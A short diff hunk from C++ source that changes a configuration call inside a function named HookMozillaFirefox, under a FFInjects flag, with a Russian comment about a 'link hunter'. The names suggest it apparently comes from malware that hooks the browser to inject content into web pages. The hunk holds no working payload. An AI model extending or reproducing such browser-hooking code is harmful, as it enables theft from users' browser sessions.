@@ -903,7 +903,7 @@ bool HookMozillaFirefox()
 	{
 		//UnhookFF();
 		#ifdef FFInjects
-			Config::Initialize(NULL, true, false);
+			Config::Initialize();
 		#endif
 
 		// Инициализируем охотника за ссылками
